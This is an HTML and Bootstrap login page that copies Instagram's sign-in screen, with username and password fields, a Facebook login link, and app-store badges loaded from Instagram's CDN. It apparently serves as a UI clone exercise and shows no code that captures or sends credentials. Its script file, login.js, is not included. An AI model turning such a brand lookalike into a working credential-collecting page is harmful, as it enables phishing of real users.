<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous" />
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
    
    <title>log in</title>
</head>
<body>
    <div class="container-fluid bg-conatiner">
        <div class="row">
            <div class="col-12 col-md-12 col-xl-12">
                <!-- Main card -->
                <div class="d-flex flex-row justify-content-center">
                    <div class="text-center card-insta shadow-lg mt-5 d-flex flex-column justify-content-center">
                        <div>
                            <img class="logo mt-3 mb-5" src="https://thumbs.dreamstime.com/b/print-204012277.jpg">
                        </div>
                        <div>
                            <input type="text" placeholder="Phone number,username,or email" class="mt-2 inp-txt">
                            <br>
                            <input type="password" placeholder="Password" class="mt-2 inp-txt">
                        </div>
                        <div class="text-center">
                            <button class="btn-logo shadow mt-3 mb-3" id="loginBtn">Log in</button>
                        </div>
                        <div class="facebook">
                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16">
                                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/>
                                <span><a href="">Log in with facebook</a></span>
                            </svg>
                        </div>
                        <div class="forgot-password mt-1 mb-3"><a>Forgot password?</a></div>
                    </div>
                </div>
                <!--Signup card-->
                <div class=" d-flex flex-row justify-content-center mt-4">
                    <div class="card-2nd shadow-lg  text-center">
                        <p class="mt-3 sign-up">Don't have an account? <a class="sign">Sign up</a></div>
                </div>
                <div class="text-white text-center mt-2">
                    <p class="get-app">Get the app.</p>
                </div>
                <div class="d-flex flex-row justify-content-center app">
                    <div class="d-flex flex-column justify-content-center">
                        <img class="app-store-logo mr-3" src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png">
                    </div>
                    <div class="d-flex flex-column justify-content-center">
                        <img class="app-store-logo" src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="login.js"></script>
</body>
</html>
